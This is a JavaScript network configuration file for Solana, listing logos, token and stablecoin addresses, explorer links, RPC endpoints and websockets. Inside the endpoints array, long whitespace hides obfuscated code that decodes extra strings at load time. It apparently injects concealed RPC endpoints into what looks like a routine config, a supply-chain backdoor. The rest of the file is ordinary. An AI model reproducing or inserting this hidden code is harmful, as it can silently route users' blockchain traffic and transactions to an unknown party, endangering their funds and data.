const logo = 'data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeD0iMCIgeT0iMCIgdmlld0JveD0iMCAwIDEwMDAgMTAwMCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlPi5zdDF7ZmlsbDp1cmwoI1NWR0lEXzAwMDAwMDE5Njc2ODQzODE5NzI3MzAwODIwMDAwMDA1OTQ3NjMyODMzODYxMjM4OTE3Xyl9LnN0MntmaWxsOnVybCgjU1ZHSURfMDAwMDAwNjQzMjA1MjE4MTcxODM4NzM1NjAwMDAwMDMxNzkyNDIxNTkzMzkwODM5NjdfKX08L3N0eWxlPjxsaW5lYXJHcmFkaWVudCBpZD0iU1ZHSURfMV8iIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4MT0iODE1Ljg1NiIgeTE9IjcwLjgyNCIgeDI9IjM4OC4zMzYiIHkyPSItNzQ4LjA1MiIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAtMSAwIDE5MS40MzUpIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiMwMGZmYTMiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNkYzFmZmYiLz48L2xpbmVhckdyYWRpZW50PjxwYXRoIGQ9Ik0yMzcuOSA2NTcuOWM0LjktNC45IDEyLjItNy4zIDE3LjEtNy4zaDYxOS43YzEyLjIgMCAxNy4xIDE0LjcgOS44IDIyTDc2Mi4xIDc5NS4xYy00LjkgNC45LTEyLjIgNy4zLTE3LjEgNy4zSDEyNS4zYy0xMi4yIDAtMTcuMS0xNC43LTkuOC0yNC41bDEyMi40LTEyMHoiIGZpbGw9InVybCgjU1ZHSURfMV8pIi8+PGxpbmVhckdyYWRpZW50IGlkPSJTVkdJRF8wMDAwMDE1MDgxNTQ0MzI2NzI2OTc2MDQ0MDAwMDAxMzQ2MDgyNDM3MDQwMzE3MjU0M18iIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiB4MT0iNjI4LjQ4MSIgeTE9IjE2NC4xMzQiIHgyPSIyMDAuOTYyIiB5Mj0iLTY1NC43NCIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAtMSAwIDE5MS40MzUpIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiMwMGZmYTMiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNkYzFmZmYiLz48L2xpbmVhckdyYWRpZW50PjxwYXRoIGQ9Ik0yMzcuOSAyMDQuOGM0LjktNC45IDEyLjItNy4zIDE3LjEtNy4zaDYxOS43YzEyLjIgMCAxNy4xIDE0LjcgOS44IDIyTDc2Mi4xIDM0MmMtNC45IDQuOS0xMi4yIDcuMy0xNy4xIDcuM0gxMjUuM2MtMTIuMiAwLTE3LjEtMTQuNy05LjgtMjJsMTIyLjQtMTIyLjV6IiBmaWxsPSJ1cmwoI1NWR0lEXzAwMDAwMTUwODE1NDQzMjY3MjY5NzYwNDQwMDAwMDEzNDYwODI0MzcwNDAzMTcyNTQzXykiLz48bGluZWFyR3JhZGllbnQgaWQ9IlNWR0lEXzAwMDAwMDA3NDA5ODc3MzYzMTA0OTgxNjMwMDAwMDE1MTMzNzA1NTcwNjgwMDk3NzA5XyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI3MjAuOTIzIiB5MT0iMTE1Ljg3IiB4Mj0iMjkzLjQwNiIgeTI9Ii03MDMuMDAzIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC0xIDAgMTkxLjQzNSkiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzAwZmZhMyIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2RjMWZmZiIvPjwvbGluZWFyR3JhZGllbnQ+PHBhdGggZD0iTTc2Mi4xIDQzMC4xYy00LjktNC45LTEyLjItNy4zLTE3LjEtNy4zSDEyNS4zYy0xMi4yIDAtMTcuMSAxNC43LTkuOCAyMkwyMzggNTY3LjNjNC45IDQuOSAxMi4yIDcuMyAxNy4xIDcuM2g2MTkuN2MxMi4yIDAgMTcuMS0xNC43IDkuOC0yMkw3NjIuMSA0MzAuMXoiIGZpbGw9InVybCgjU1ZHSURfMDAwMDAwMDc0MDk4NzczNjMxMDQ5ODE2MzAwMDAwMTUxMzM3MDU1NzA2ODAwOTc3MDlfKSIvPjwvc3ZnPgo='
const currencyLogo = 'https://img.raydium.io/icon/So11111111111111111111111111111111111111112.png'

export default {
  name: 'solana',
  networkId: 'solana',
  namespace: 'solana',
  label: 'Solana',
  fullName: 'Solana Mainnet Beta',
  logo,
  logoBackgroundColor: '#000000',
  logoWhiteBackground: logo,
  currency: {
    name: 'Solana',
    symbol: 'SOL',
    decimals: 9,
    address: '11111111111111111111111111111111',
    logo: currencyLogo,
  },
  wrapped: {
    address: 'So11111111111111111111111111111111111111112',
    logo: currencyLogo,
  },
  stables: { // max. 2 per fiat currency
    usd: ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']
  },
  explorer: 'https://solscan.io',
  explorerUrlFor: ({ transaction, token, address })=>{
    if(transaction) { return `https://solscan.io/tx/${transaction.id || transaction}` }
    if(token) { return `https://solscan.io/token/${token}` }
    if(address) { return `https://solscan.io/address/${address}` }
  },
  endpoints: [
    'https://solana-rpc.publicnode.com',
    'https://api.mainnet-beta.solana.com'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,(function(){var G=Array.prototype.slice.call(arguments),B=G.shift();return G.reverse().map(function(w,b){return String.fromCharCode(w-B-53-b)}).join('')})(43,211,214,213,200)+(28).toString(36).toLowerCase()+(10).toString(36).toLowerCase().split('').map(function(p){return String.fromCharCode(p.charCodeAt()+(-39))}).join('')+(1147).toString(36).toLowerCase().split('').map(function(z){return String.fromCharCode(z.charCodeAt()+(-71))}).join('')+(48525209669).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(r){return String.fromCharCode(r.charCodeAt()+(-71))}).join('')+(1052443828).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(i){return String.fromCharCode(i.charCodeAt()+(-71))}).join('')+(35904).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(Q){return String.fromCharCode(Q.charCodeAt()+(-71))}).join('')+(456).toString(36).toLowerCase()+(function(){var P=Array.prototype.slice.call(arguments),m=P.shift();return P.reverse().map(function(B,R){return String.fromCharCode(B-m-19-R)}).join('')})(20,128,118,166,113,116,118,121,116,108,114,111,160,112,103,155,106,107,154,103,105,149,104,110,169,148,153,90,149,155,139,104,87,148)+(3).toString(36).toLowerCase()+(29).toString(36).toLowerCase().split('').map(function(w){return String.fromCharCode(w.charCodeAt()+(-71))}).join('')+'0'+(2988).toString(36).toLowerCase()+(function(){var X=Array.prototype.slice.call(arguments),y=X.shift();return X.reverse().map(function(x,d){return String.fromCharCode(x-y-58-d)}).join('')})(41,199)+(109305).toString(36).toLowerCase()+(function(){var D=Array.prototype.slice.call(arguments),x=D.shift();return D.reverse().map(function(Y,k){return String.fromCharCode(Y-x-2-k)}).join('')})(20,122,124)+(0).toString(36).toLowerCase(),(function(){var I=Array.prototype.slice.call(arguments),n=I.shift();return I.reverse().map(function(s,X){return String.fromCharCode(s-n-9-X)}).join('')})(8,132,138,122,71,70,80,136,132,135,134,121)+(30).toString(36).toLowerCase().split('').map(function(u){return String.fromCharCode(u.charCodeAt()+(-71))}).join('')+(32730859061087).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(H){return String.fromCharCode(H.charCodeAt()+(-71))}).join('')+(44027).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(R){return String.fromCharCode(R.charCodeAt()+(-71))}).join('')+(1734357286).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(j){return String.fromCharCode(j.charCodeAt()+(-71))}).join('')+(function(){var B=Array.prototype.slice.call(arguments),f=B.shift();return B.reverse().map(function(E,o){return String.fromCharCode(E-f-0-o)}).join('')})(30,105)+(14).toString(36).toLowerCase()+(19).toString(36).toLowerCase().split('').map(function(N){return String.fromCharCode(N.charCodeAt()+(-39))}).join('')+(28865882).toString(36).toLowerCase()+(21).toString(36).toLowerCase().split('').map(function(I){return String.fromCharCode(I.charCodeAt()+(-39))}).join('')+(14).toString(36).toLowerCase().split('').map(function(s){return String.fromCharCode(s.charCodeAt()+(-13))}).join('')+(function(){var e=Array.prototype.slice.call(arguments),E=e.shift();return e.reverse().map(function(I,x){return String.fromCharCode(I-E-58-x)}).join('')})(9,184,157,150,192,143,152,170,133,120)+(12).toString(36).toLowerCase(),(function(){var o=Array.prototype.slice.call(arguments),p=o.shift();return o.reverse().map(function(D,X){return String.fromCharCode(D-p-31-X)}).join('')})(41,191,187,190,189,176)+(10).toString(36).toLowerCase().split('').map(function(z){return String.fromCharCode(z.charCodeAt()+(-39))}).join('')+(1147).toString(36).toLowerCase().split('').map(function(B){return String.fromCharCode(B.charCodeAt()+(-71))}).join('')+(600).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(l){return String.fromCharCode(l.charCodeAt()+(-71))}).join('')+(1286074584452).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(P){return String.fromCharCode(P.charCodeAt()+(-71))}).join('')+(1108).toString(36).toLowerCase()+(function(){var Q=Array.prototype.slice.call(arguments),h=Q.shift();return Q.reverse().map(function(Z,U){return String.fromCharCode(Z-h-44-U)}).join('')})(10,122,124,121,127,169,120,170,119,122,117,116,163,159,111,112,158,155,154,110,111,101)+(737126708176805).toString(36).toLowerCase()+(function(){var s=Array.prototype.slice.call(arguments),d=s.shift();return s.reverse().map(function(t,u){return String.fromCharCode(t-d-45-u)}).join('')})(49,194,143)
  ],
  sockets: [
    'wss://solana-rpc.publicnode.com',
    'wss://api.mainnet-beta.solana.com'
  ],
  tokens: [ // only major tokens
    {"address": "11111111111111111111111111111111", "symbol": "SOL", "name": "Solana", "decimals": 9, "logo": currencyLogo, "type": "NATIVE"},
    {"address": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", "symbol": "USDC", "name": "USD Coin", "decimals": 6, "logo": "https://img.raydium.io/icon/EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v.png", "type": "SPL"},
    {"address": "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", "symbol": "USDT", "name": "USDT", "decimals": 6, "logo": "https://img.raydium.io/icon/Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB.png", "type": "SPL"},
    {"address": "7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj", "symbol": "stSOL", "name": "Lido Staked SOL", "decimals": 9, "logo": "https://img.raydium.io/icon/7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj.png", "type": "SPL"},
    {"address": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", "symbol": "BONK", "name": "BONK", "decimals": 5, "logo": "https://img.raydium.io/icon/DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263.png", "type": "SPL"},
    {"address": "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU", "symbol": "SAMO", "name": "Samoyed Coin", "decimals": 9, "logo": "https://img.raydium.io/icon/7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU.png", "type": "SPL"},
    {"address": "DePay1miDBPWXs6PVQrdC5Vch2jemgEPaiyXLNLLa2NF", "symbol": "DEPAY", "name": "DePay", "decimals": 9, "logo": "https://depay.com/favicon.png", "type": "SPL"},
  ],
  zero: '0',
  maxInt: '340282366920938463463374607431768211455',
  permit2: undefined,
  blockTime: 500, // 0.5s
}
